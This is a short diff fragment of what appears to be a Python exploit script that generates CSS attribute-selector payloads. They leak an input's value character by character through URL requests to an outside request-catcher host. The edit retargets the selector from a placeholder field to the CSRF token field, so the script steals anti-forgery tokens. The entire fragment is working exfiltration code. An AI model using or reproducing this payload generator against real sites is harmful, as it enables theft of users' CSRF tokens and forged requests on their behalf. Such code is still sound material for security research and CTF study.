@@ -6,7 +6,7 @@ css = ""
 for c in filter(str.isalnum, string.printable):
     payload = f"{prefix}{c}"
     css += f"""
-[name="foo"][value^="{payload}"] {{
+[name="csrf"][value^="{payload}"] {{
     --value: url("https://toto.requestcatcher.com/{payload}")
 }}
 """
